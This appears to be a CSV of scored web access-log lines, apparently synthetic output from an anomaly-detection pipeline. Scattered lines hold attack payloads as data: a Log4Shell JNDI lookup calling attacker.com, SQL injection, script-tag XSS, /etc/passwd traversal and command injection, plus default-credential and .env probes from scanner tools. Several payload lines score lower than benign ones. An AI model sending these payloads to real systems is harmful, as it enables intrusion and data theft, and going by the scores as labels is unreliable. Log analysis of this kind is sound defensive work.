score_content,score_session,score_fused,line
17.10833168029785,,17.10833168029785,129.226.36.113 - - [10/Jan/2025:12:15:24 +0000] "GET /search?q=headphones HTTP/1.1" 403 13 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.68944251537323,,1.68944251537323,41.93.155.184 - - [10/Jan/2025:12:15:24 +0000] "GET /login HTTP/1.1" 200 6224 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.65651273727417,,1.65651273727417,123.54.152.42 - - [10/Jan/2025:12:15:27 +0000] "GET /contact HTTP/1.1" 200 15789 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
0.22870057821273804,,0.22870057821273804,35.162.132.11 - - [10/Jan/2025:12:15:27 +0000] "GET /assets/app.css HTTP/1.1" 200 5379 "https://www.google.com/" "python-requests/2.31.0"
0.27743640542030334,,0.27743640542030334,154.249.145.164 - - [10/Jan/2025:12:15:27 +0000] "GET /assets/app.js HTTP/1.1" 200 13385 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
16.803075790405273,,16.803075790405273,57.213.106.154 - - [10/Jan/2025:12:15:27 +0000] "GET /search?q=headphones HTTP/1.1" 401 349 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.7071502208709717,,1.7071502208709717,237.117.153.152 - - [10/Jan/2025:12:15:28 +0000] "GET /login HTTP/1.1" 200 11328 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.6604304313659668,,1.6604304313659668,221.233.130.176 - - [10/Jan/2025:12:15:31 +0000] "GET /contact HTTP/1.1" 200 17228 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
17.01487922668457,,17.01487922668457,10.225.201.137 - - [10/Jan/2025:12:15:35 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 403 1228 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
12.935516357421875,,12.935516357421875,167.111.134.108 - - [10/Jan/2025:12:15:38 +0000] "GET / HTTP/1.1" 403 1389 "-" "curl/7.68.0"
16.925222396850586,,16.925222396850586,203.197.98.90 - - [10/Jan/2025:12:15:43 +0000] "GET /api/product?id=123 HTTP/1.1" 404 987 "https://twitter.com/" "python-requests/2.31.0"
1.6948661804199219,,1.6948661804199219,233.220.22.73 - - [10/Jan/2025:12:15:43 +0000] "GET /login HTTP/1.1" 200 7718 "https://twitter.com/" "python-requests/2.31.0"
3.958828926086426,,3.958828926086426,148.134.31.134 - - [10/Jan/2025:12:15:46 +0000] "GET / HTTP/1.1" 302 333 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.557944416999817,,1.557944416999817,40.110.167.150 - - [10/Jan/2025:12:15:51 +0000] "GET /dashboard HTTP/1.1" 200 3592 "https://example.com/" "curl/7.68.0"
1.6487782001495361,,1.6487782001495361,194.53.106.142 - - [10/Jan/2025:12:15:55 +0000] "GET /profile HTTP/1.1" 200 13123 "https://news.ycombinator.com/" "python-requests/2.31.0"
5.768728256225586,,5.768728256225586,148.89.199.181 - - [10/Jan/2025:12:15:56 +0000] "GET /search?q=headphones HTTP/1.1" 200 10148 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
5.69900369644165,,5.69900369644165,26.55.131.103 - - [10/Jan/2025:12:16:01 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 5401 "https://twitter.com/" "sqlmap/1.5.10#stable"
0.36664819717407227,,0.36664819717407227,206.24.211.38 - - [10/Jan/2025:12:16:05 +0000] "GET /index.html HTTP/1.1" 200 273 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
5.9164276123046875,,5.9164276123046875,156.10.186.99 - - [10/Jan/2025:12:16:08 +0000] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 2722 "https://twitter.com/" "dirb/2.22"
12.110751152038574,,12.110751152038574,164.127.113.3 - - [10/Jan/2025:12:16:13 +0000] "GET /index.html HTTP/1.1" 429 358 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.826114177703857,,5.826114177703857,93.62.168.1 - - [10/Jan/2025:12:16:15 +0000] "GET /api/product?id=123 HTTP/1.1" 201 1281 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.6929144859313965,,3.6929144859313965,151.52.133.4 - - [10/Jan/2025:12:16:17 +0000] "GET /profile HTTP/1.1" 301 13385 "-" "sqlmap/1.5.10#stable"
1.6359672546386719,,1.6359672546386719,58.156.247.50 - - [10/Jan/2025:12:16:17 +0000] "GET /profile HTTP/1.1" 200 9160 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
0.09923306107521057,,0.09923306107521057,144.19.129.76 - - [10/Jan/2025:12:16:21 +0000] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 3588 "-" "sqlmap/1.5.10#stable"
3.7540016174316406,,3.7540016174316406,145.124.198.63 - - [10/Jan/2025:12:16:25 +0000] "GET /login HTTP/1.1" 301 12456 "https://news.ycombinator.com/" "curl/7.68.0"
1.8818126916885376,,1.8818126916885376,18.98.163.202 - - [10/Jan/2025:12:16:30 +0000] "GET / HTTP/1.1" 200 8548 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.6468539237976074,,1.6468539237976074,180.214.68.64 - - [10/Jan/2025:12:16:32 +0000] "GET /profile HTTP/1.1" 200 418 "-" "curl/7.68.0"
1.566012978553772,,1.566012978553772,122.81.91.56 - - [10/Jan/2025:12:16:35 +0000] "GET /dashboard HTTP/1.1" 200 5948 "https://example.com/" "python-requests/2.31.0"
1.5574803352355957,,1.5574803352355957,61.189.62.224 - - [10/Jan/2025:12:16:36 +0000] "GET /api/products HTTP/1.1" 200 6642 "https://www.google.com/" "curl/7.68.0"
16.834089279174805,,16.834089279174805,40.200.28.31 - - [10/Jan/2025:12:16:37 +0000] "GET /api/product?id=123 HTTP/1.1" 400 729 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11.2998046875,,11.2998046875,159.81.127.230 - - [10/Jan/2025:12:16:41 +0000] "GET /wp-login.php HTTP/1.1" 401 760 "https://news.ycombinator.com/" "python-requests/2.31.0"
1.72898530960083,,1.72898530960083,33.14.135.205 - - [10/Jan/2025:12:16:42 +0000] "GET /login HTTP/1.1" 200 18996 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
5.750566482543945,,5.750566482543945,118.250.31.179 - - [10/Jan/2025:12:16:46 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 5827 "https://example.com/" "nikto/2.5.0"
5.677222728729248,,5.677222728729248,84.93.157.221 - - [10/Jan/2025:12:16:51 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 3401 "https://www.google.com/" "python-requests/2.31.0"
1.7071954011917114,,1.7071954011917114,94.48.128.109 - - [10/Jan/2025:12:16:55 +0000] "GET /login HTTP/1.1" 200 11342 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
12.657668113708496,,12.657668113708496,116.47.147.34 - - [10/Jan/2025:12:17:00 +0000] "GET /profile HTTP/1.1" 401 572 "https://www.google.com/" "python-requests/2.31.0"
5.857480049133301,,5.857480049133301,51.38.205.246 - - [10/Jan/2025:12:17:00 +0000] "GET /api/product?id=123 HTTP/1.1" 200 12580 "https://www.google.com/" "sqlmap/1.5.10#stable"
0.24726486206054688,,0.24726486206054688,229.218.162.133 - - [10/Jan/2025:12:17:03 +0000] "GET /assets/app.js HTTP/1.1" 200 4506 "https://example.com/" "python-requests/2.31.0"
0.3237815201282501,,0.3237815201282501,16.56.209.66 - - [10/Jan/2025:12:17:06 +0000] "GET /index.html HTTP/1.1" 200 5452 "-" "Wget/1.20.3 (linux-gnu)"
1.727620244026184,,1.727620244026184,143.239.208.66 - - [10/Jan/2025:12:17:09 +0000] "GET /login HTTP/1.1" 200 18461 "-" "curl/7.68.0"
5.722896099090576,,5.722896099090576,45.251.200.73 - - [10/Jan/2025:12:17:12 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 17743 "https://example.com/" "sqlmap/1.5.10#stable"
16.892078399658203,,16.892078399658203,158.74.119.162 - - [10/Jan/2025:12:17:17 +0000] "GET /search?q=camera HTTP/1.1" 403 780 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.6061500310897827,,1.6061500310897827,104.218.233.19 - - [10/Jan/2025:12:17:22 +0000] "GET /dashboard HTTP/1.1" 200 18831 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.5673847198486328,,1.5673847198486328,155.166.102.70 - - [10/Jan/2025:12:17:24 +0000] "GET /dashboard HTTP/1.1" 204 8864 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
5.821789264678955,,5.821789264678955,219.6.33.187 - - [10/Jan/2025:12:17:29 +0000] "GET /search?q=camera HTTP/1.1" 200 6125 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.7127054929733276,,1.7127054929733276,27.25.17.240 - - [10/Jan/2025:12:17:34 +0000] "GET /about HTTP/1.1" 200 13110 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
0.49934473633766174,,0.49934473633766174,27.68.159.40 - - [10/Jan/2025:12:17:34 +0000] "GET /.env HTTP/1.1" 200 2827 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.6497119665145874,,1.6497119665145874,34.135.215.44 - - [10/Jan/2025:12:17:36 +0000] "GET /logout HTTP/1.1" 200 4242 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
12.585973739624023,,12.585973739624023,250.223.139.240 - - [10/Jan/2025:12:17:41 +0000] "GET /dashboard HTTP/1.1" 401 956 "https://twitter.com/" "curl/7.68.0"
0.13721629977226257,,0.13721629977226257,162.192.163.225 - - [10/Jan/2025:12:17:44 +0000] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 15060 "https://twitter.com/" "dirb/2.22"
12.74887752532959,,12.74887752532959,139.59.207.23 - - [10/Jan/2025:12:17:49 +0000] "GET /logout HTTP/1.1" 404 986 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
0.3293345868587494,,0.3293345868587494,134.209.195.218 - - [10/Jan/2025:12:17:51 +0000] "GET /assets/app.css HTTP/1.1" 200 103 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.9488396644592285,,3.9488396644592285,243.194.123.77 - - [10/Jan/2025:12:17:53 +0000] "GET / HTTP/1.1" 301 16219 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.8736499547958374,,1.8736499547958374,106.226.144.112 - - [10/Jan/2025:12:17:55 +0000] "GET / HTTP/1.1" 200 6279 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
16.835695266723633,,16.835695266723633,68.21.109.161 - - [10/Jan/2025:12:17:56 +0000] "GET /search?q=laptop HTTP/1.1" 400 451 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.7251944541931152,,1.7251944541931152,208.69.106.49 - - [10/Jan/2025:12:18:00 +0000] "GET /login HTTP/1.1" 200 17530 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
5.8296217918396,,5.8296217918396,180.160.126.49 - - [10/Jan/2025:12:18:01 +0000] "GET /search?q=camera HTTP/1.1" 201 9017 "-" "curl/7.68.0"
1.6799694299697876,,1.6799694299697876,73.69.33.184 - - [10/Jan/2025:12:18:02 +0000] "GET /admin HTTP/1.1" 200 3451 "-" "nikto/2.5.0"
1.7070698738098145,,1.7070698738098145,108.80.202.205 - - [10/Jan/2025:12:18:03 +0000] "GET /admin HTTP/1.1" 200 11303 "https://example.com/" "nikto/2.5.0"
0.32176560163497925,,0.32176560163497925,15.69.199.101 - - [10/Jan/2025:12:18:06 +0000] "GET /index.html HTTP/1.1" 200 4887 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
12.903992652893066,,12.903992652893066,32.250.197.183 - - [10/Jan/2025:12:18:09 +0000] "GET /login HTTP/1.1" 400 25 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.3164754807949066,,0.3164754807949066,134.171.252.54 - - [10/Jan/2025:12:18:12 +0000] "GET /index.html HTTP/1.1" 200 3178 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
1.557756781578064,,1.557756781578064,191.240.141.134 - - [10/Jan/2025:12:18:17 +0000] "GET /dashboard HTTP/1.1" 200 1482 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.545159935951233,,1.545159935951233,222.171.56.250 - - [10/Jan/2025:12:18:20 +0000] "GET /api/products HTTP/1.1" 200 1806 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.8838943243026733,,1.8838943243026733,150.31.102.203 - - [10/Jan/2025:12:18:25 +0000] "GET / HTTP/1.1" 200 9147 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
7.795577526092529,,7.795577526092529,96.198.23.64 - - [10/Jan/2025:12:18:25 +0000] "GET /search?q=headphones HTTP/1.1" 301 5178 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
12.654894828796387,,12.654894828796387,16.16.92.166 - - [10/Jan/2025:12:18:25 +0000] "GET /dashboard HTTP/1.1" 404 1280 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.739834308624268,,5.739834308624268,202.166.194.89 - - [10/Jan/2025:12:18:25 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 18396 "https://www.google.com/" "nikto/2.5.0"
3.6874868869781494,,3.6874868869781494,231.11.125.181 - - [10/Jan/2025:12:18:25 +0000] "GET /profile HTTP/1.1" 302 8314 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
5.75492525100708,,5.75492525100708,140.90.83.188 - - [10/Jan/2025:12:18:27 +0000] "GET /search?q=headphones HTTP/1.1" 200 6215 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
0.24962030351161957,,0.24962030351161957,116.76.210.68 - - [10/Jan/2025:12:18:31 +0000] "GET /assets/app.js HTTP/1.1" 200 5179 "https://example.com/" "python-requests/2.31.0"
2.569636344909668,,2.569636344909668,159.220.94.199 - - [10/Jan/2025:12:18:34 +0000] "GET /.env HTTP/1.1" 302 713 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
0.5428125262260437,,0.5428125262260437,197.142.40.157 - - [10/Jan/2025:12:18:39 +0000] "GET /.env HTTP/1.1" 200 16403 "https://example.com/" "python-requests/2.31.0"
1.6140745878219604,,1.6140745878219604,12.214.241.34 - - [10/Jan/2025:12:18:42 +0000] "GET /contact HTTP/1.1" 200 2284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.725646018981934,,5.725646018981934,165.215.100.169 - - [10/Jan/2025:12:18:43 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 18810 "https://twitter.com/" "nikto/2.5.0"
1.6934771537780762,,1.6934771537780762,156.184.19.4 - - [10/Jan/2025:12:18:47 +0000] "GET /login HTTP/1.1" 200 7332 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.3516409993171692,,0.3516409993171692,211.95.204.182 - - [10/Jan/2025:12:18:47 +0000] "GET /index.html HTTP/1.1" 200 13729 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
12.756196022033691,,12.756196022033691,242.56.246.133 - - [10/Jan/2025:12:18:49 +0000] "GET /about HTTP/1.1" 400 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
5.857256889343262,,5.857256889343262,169.64.146.161 - - [10/Jan/2025:12:18:54 +0000] "GET /search?q=laptop HTTP/1.1" 200 17342 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.7419075965881348,,3.7419075965881348,92.173.118.180 - - [10/Jan/2025:12:18:59 +0000] "GET /contact HTTP/1.1" 304 18992 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
0.28669264912605286,,0.28669264912605286,87.169.41.137 - - [10/Jan/2025:12:18:59 +0000] "GET /assets/app.js HTTP/1.1" 200 16637 "https://news.ycombinator.com/" "python-requests/2.31.0"
12.564314842224121,,12.564314842224121,196.163.111.212 - - [10/Jan/2025:12:19:01 +0000] "GET /dashboard HTTP/1.1" 400 844 "https://example.com/" "sqlmap/1.5.10#stable"
1.5932974815368652,,1.5932974815368652,238.191.66.93 - - [10/Jan/2025:12:19:05 +0000] "GET /api/products HTTP/1.1" 200 18130 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
568.1182250976562,,568.1182250976562,5.133.35.228 - - [10/Jan/2025:12:19:08 +0000] "GET /wp-login.php HTTP/1.1" 502 1220 "-" "python-requests/2.31.0"
12.742175102233887,,12.742175102233887,198.211.242.177 - - [10/Jan/2025:12:19:10 +0000] "GET /api/products HTTP/1.1" 401 44 "https://twitter.com/" "curl/7.68.0"
0.2610386610031128,,0.2610386610031128,92.40.36.68 - - [10/Jan/2025:12:19:14 +0000] "GET /assets/app.css HTTP/1.1" 200 15185 "https://twitter.com/" "curl/7.68.0"
1.680306315422058,,1.680306315422058,146.235.56.188 - - [10/Jan/2025:12:19:15 +0000] "GET /logout HTTP/1.1" 200 13200 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.6386313438415527,,1.6386313438415527,10.188.207.148 - - [10/Jan/2025:12:19:18 +0000] "GET /contact HTTP/1.1" 200 9943 "-" "Wget/1.20.3 (linux-gnu)"
1.5939098596572876,,1.5939098596572876,107.239.223.31 - - [10/Jan/2025:12:19:18 +0000] "GET /dashboard HTTP/1.1" 200 14331 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.85709810256958,,5.85709810256958,11.82.139.145 - - [10/Jan/2025:12:19:18 +0000] "GET /search?q=laptop HTTP/1.1" 200 17282 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.25455763936042786,,0.25455763936042786,249.115.193.153 - - [10/Jan/2025:12:19:22 +0000] "GET /assets/app.css HTTP/1.1" 200 12973 "https://twitter.com/" "python-requests/2.31.0"
3.7291829586029053,,3.7291829586029053,34.87.22.122 - - [10/Jan/2025:12:19:22 +0000] "GET /logout HTTP/1.1" 304 4950 "-" "python-requests/2.31.0"
1.7163466215133667,,1.7163466215133667,199.179.34.196 - - [10/Jan/2025:12:19:26 +0000] "GET /about HTTP/1.1" 200 14337 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.814164161682129,,5.814164161682129,144.158.189.135 - - [10/Jan/2025:12:19:30 +0000] "GET /search?q=laptop HTTP/1.1" 204 6525 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.881722927093506,,5.881722927093506,23.29.172.106 - - [10/Jan/2025:12:19:30 +0000] "GET /search?q=phone HTTP/1.1" 200 18974 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
1.624098300933838,,1.624098300933838,198.79.44.253 - - [10/Jan/2025:12:19:32 +0000] "GET /profile HTTP/1.1" 200 893 "https://twitter.com/" "curl/7.68.0"
5.827653408050537,,5.827653408050537,52.176.96.40 - - [10/Jan/2025:12:19:35 +0000] "GET /search?q=camera HTTP/1.1" 200 7750 "-" "sqlmap/1.5.10#stable"
17.625497817993164,,17.625497817993164,223.214.210.74 - - [10/Jan/2025:12:19:35 +0000] "GET /api/product?id=123 HTTP/1.1" 429 302 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.6566033363342285,,1.6566033363342285,85.54.190.138 - - [10/Jan/2025:12:19:40 +0000] "GET /logout HTTP/1.1" 200 845 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.6840535402297974,,1.6840535402297974,178.179.172.5 - - [10/Jan/2025:12:19:44 +0000] "GET /login HTTP/1.1" 200 4731 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
1.7007807493209839,,1.7007807493209839,52.203.179.159 - - [10/Jan/2025:12:19:49 +0000] "GET /login HTTP/1.1" 200 9406 "-" "curl/7.68.0"
1.8833521604537964,,1.8833521604537964,170.219.234.169 - - [10/Jan/2025:12:19:52 +0000] "GET / HTTP/1.1" 200 8990 "-" "curl/7.68.0"
5.84367036819458,,5.84367036819458,131.251.182.26 - - [10/Jan/2025:12:19:52 +0000] "GET /search?q=laptop HTTP/1.1" 200 12574 "https://news.ycombinator.com/" "curl/7.68.0"
0.28245434165000916,,0.28245434165000916,144.238.183.6 - - [10/Jan/2025:12:19:56 +0000] "GET /assets/app.js HTTP/1.1" 200 15107 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
5.75141716003418,,5.75141716003418,5.89.176.91 - - [10/Jan/2025:12:20:00 +0000] "GET /search?q=headphones HTTP/1.1" 200 5244 "https://example.com/" "curl/7.68.0"
3.7747251987457275,,3.7747251987457275,225.100.228.209 - - [10/Jan/2025:12:20:01 +0000] "GET /login HTTP/1.1" 304 8543 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
12.629530906677246,,12.629530906677246,36.23.187.98 - - [10/Jan/2025:12:20:03 +0000] "GET /dashboard HTTP/1.1" 403 1345 "https://twitter.com/" "python-requests/2.31.0"
5.838357925415039,,5.838357925415039,110.249.80.233 - - [10/Jan/2025:12:20:08 +0000] "GET /search?q=phone HTTP/1.1" 200 5105 "https://example.com/" "python-requests/2.31.0"
1.586755633354187,,1.586755633354187,139.176.205.52 - - [10/Jan/2025:12:20:11 +0000] "GET /api/products HTTP/1.1" 204 19139 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.2268386036157608,,0.2268386036157608,168.239.145.235 - - [10/Jan/2025:12:20:16 +0000] "GET /assets/app.css HTTP/1.1" 200 4856 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.620566964149475,,1.620566964149475,187.8.196.82 - - [10/Jan/2025:12:20:16 +0000] "GET /contact HTTP/1.1" 200 4868 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
1.6895670890808105,,1.6895670890808105,28.34.48.7 - - [10/Jan/2025:12:20:18 +0000] "GET /login HTTP/1.1" 200 6258 "https://twitter.com/" "python-requests/2.31.0"
5.841142654418945,,5.841142654418945,176.7.92.21 - - [10/Jan/2025:12:20:20 +0000] "GET /api/product?id=123 HTTP/1.1" 200 7666 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
7.831264972686768,,7.831264972686768,48.219.100.126 - - [10/Jan/2025:12:20:21 +0000] "GET /search?q=headphones HTTP/1.1" 302 12353 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
0.33615660667419434,,0.33615660667419434,237.70.244.106 - - [10/Jan/2025:12:20:22 +0000] "GET /index.html HTTP/1.1" 200 591 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
11.209898948669434,,11.209898948669434,177.84.222.118 - - [10/Jan/2025:12:20:23 +0000] "GET /cgi-bin/test.cgi HTTP/1.1" 401 1003 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
7.90048360824585,,7.90048360824585,157.241.191.147 - - [10/Jan/2025:12:20:26 +0000] "GET /search?q=laptop HTTP/1.1" 302 13015 "https://twitter.com/" "python-requests/2.31.0"
0.35503971576690674,,0.35503971576690674,117.212.225.11 - - [10/Jan/2025:12:20:30 +0000] "GET /index.html HTTP/1.1" 200 14898 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.36088189482688904,,0.36088189482688904,196.162.247.13 - - [10/Jan/2025:12:20:34 +0000] "GET /index.html HTTP/1.1" 200 17012 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.7452688217163086,,3.7452688217163086,119.43.109.76 - - [10/Jan/2025:12:20:37 +0000] "GET /logout HTTP/1.1" 304 9468 "-" "python-requests/2.31.0"
0.26023176312446594,,0.26023176312446594,24.185.129.29 - - [10/Jan/2025:12:20:42 +0000] "GET /assets/app.css HTTP/1.1" 200 14901 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
